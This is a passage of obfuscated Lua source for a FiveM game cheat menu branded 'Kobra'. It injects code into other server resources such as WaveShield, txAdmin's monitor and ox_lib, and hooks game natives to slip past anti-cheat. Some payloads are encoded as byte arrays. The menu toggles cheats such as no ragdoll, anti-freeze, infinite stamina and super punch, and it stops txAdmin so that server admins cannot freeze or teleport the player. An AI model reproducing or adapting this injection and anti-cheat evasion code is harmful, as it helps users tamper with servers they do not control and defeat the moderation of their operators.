                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",3000);break;end end end elseif v379 then v12:Notify("success","Kobra","No Ragdoll Disabled",3590 -(563 + 27) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);else v48(v380,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",11737 -8737 );end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v381) local v382=1487 -(85 + 1402) ;local v383;local v384;while true do if ((0 + 0)==v382) then v383=GetResourceState("WaveShield")=="started" ;v384=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v382=1;end if (v382==1) then if v381 then if v383 then local v1035=0 -0 ;while true do if (v1035==(403 -(274 + 129))) then v12:Notify("success","Kobra","Anti-Freeze Enabled",3217 -(12 + 205) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v48(v384,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",2738 + 262 );end elseif v383 then local v1036=0;while true do if ((0 -0)==v1036) then v12:Notify("error","Kobra","Anti-Freeze Disabled",2904 + 96 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);break;end end else local v1037=384 -(27 + 357) ;while true do if (v1037==(480 -(91 + 389))) then v48(v384,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",3297 -(90 + 207) );break;end end end break;end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v385) if v385 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v386) if v386 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v387) if v387 then local v595=1795 -(730 + 1065) ;while true do if (v595==0) then v12:Notify("success","Kobra","Infinite Stamina On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else local v596=1563 -(1339 + 224) ;while true do if (v596==(0 + 0)) then v12:Notify("error","Kobra","Infinite Stamina Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v388) local v389=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v388 then v48(v389,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v389,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v390) local v391=0;local v392;local v393;while true do if (v391==(1 + 0)) then if v390 then if v392 then local v1038=0 -0 ;while true do if (v1038==(843 -(268 + 575))) then v12:Notify("success","Kobra","Super Punch Enabled",4294 -(919 + 375) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else local v1039=0 -0 ;while true do if (v1039==0) then v48(v393,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",3971 -(180 + 791) );break;end end end elseif v392 then local v1040=1805 -(323 + 1482) ;while true do if (v1040==(1918 -(1177 + 741))) then v12:Notify("error","Kobra","Super Punch Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);break;end end else v48(v393,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",197 + 2803 );end break;end if (v391==(0 -0)) then v392=GetResourceState("WaveShield")=="started" ;v393=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v391=1 + 0 ;end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v394) if v394 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v395) if v395 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(112 -(96 + 13) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(3,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v396) if v396 then MachoResourceStop("monitor");print("started");else local v597=1921 -(962 + 959) ;while true do if (v597==(0 -0)) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v397) if v397 then local v598=1351 -(461 + 890) ;while true do if (v598==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else local v599=0 -0 ;while true do if (v599==0) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v398) if v398 then MachoResourceStop("monitor");print("started");else local v600=0;while true do if (v600==(0 + 0)) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1 + 0 ,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v399) if (v399=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1,values={"Freemode Male","Freemode Female"},onSelect=function(v400) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v400));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v401) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
